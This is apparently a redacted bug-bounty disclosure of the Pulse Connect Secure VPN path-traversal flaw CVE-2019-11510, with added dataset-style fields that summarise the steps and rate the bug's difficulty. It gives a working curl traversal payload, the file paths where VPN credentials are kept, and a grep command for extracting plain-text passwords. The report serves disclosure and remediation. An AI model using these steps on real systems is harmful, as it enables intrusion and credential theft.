title: [CVE-2019-11510 ] Path Traversal on ████████ leads to leaked passwords, RCE, etc
content:
Summary / Description:
█████ is vulnerable to Path Traversal which can lead to remote code execution.
Impact
Critical
Step-by-step Reproduction Instructions
Run the following cURL command to get the file /etc/hosts
Code 132 Bytes
1curl --path-as-is -k -D- 'https://███████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#'
Code 2.29 KiB

We can grab any other file on this system:
Code 189 Bytes
1/data/runtime/mtmp/system
2/data/runtime/mtmp/lmdb/dataa/data.mdb
3/data/runtime/mtmp/lmdb/dataa/lock.mdb
4/data/runtime/mtmp/lmdb/randomVal/data.mdb
5/data/runtime/mtmp/lmdb/randomVal/lock.mdb
The VPN user and hashed passwords are stored in the mtmp/system file, but when users log into the application, it caches the plain-text password into dataa/data.mdb.
Code 29 Bytes
1grep 'password@9' data.mdb -a
will get you a load of plain-text passwords
████████
Product, Version, and Configuration (If applicable)
https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101
Suggested Mitigation/Remediation Actions
Update the Pulse Connect Secure VPN
Impact
Critical, an attacker can get code execution with this vulnerability.
References:
https://hackerone.com/reports/591295
Thanks,
Corben (@cdl)
steps: Run the following cURL command to exploit the path traversal vulnerability: curl --path-as-is -k -D- 'https://███████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#'
Use the path traversal to access sensitive files such as /data/runtime/mtmp/system or /data/runtime/mtmp/lmdb/dataa/data.mdb to extract plain-text passwords
vuln_description: The vulnerability is a path traversal in Pulse Connect Secure VPN that allows an attacker to access arbitrary files on the system, including those containing VPN user credentials in plain-text, leading to potential remote code execution.
reason: The attack involves a straightforward path traversal technique without requiring multiple components or complex state manipulation. The vulnerability is well-known and documented, making its discovery less complex.
